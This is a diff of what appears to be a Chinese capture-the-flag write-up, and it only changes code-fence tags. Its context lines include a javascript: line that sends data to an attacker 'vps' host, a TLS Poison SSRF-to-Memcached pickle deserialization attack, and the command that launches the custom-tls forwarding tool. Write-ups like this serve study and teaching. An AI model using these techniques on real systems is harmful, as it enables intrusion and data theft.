@@ -237,7 +237,7 @@ javascript:s=q=>window.open('https://vps?q='+encodeURIComponent(q));s('start');w
 
 TLS Poison 攻击通过FTPS被动模式 ssrf去打Memcached，写入session值为pickle反序列化payload。TLS 工具：https://github.com/ZeddYu/TLS-poison/ ，按照 setup 做好初始化后，使用如下命令开启 rustls 的转发功能，将 TLS 上层流量转发到 2048 端口：
 
-```
+```text
 TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 
 import socketserver, threading, requests, subprocess,time, base64, secrets,sys, hashlib, os
 import redis, secrets, re
@@ -417,7 +417,7 @@ for idx in range(len(chunks)):
 
 shell脚本，和文件放一个目录解压
 
-```Plain%20Text
+```text
 #!bin/bash
 
 mkdir 'out'
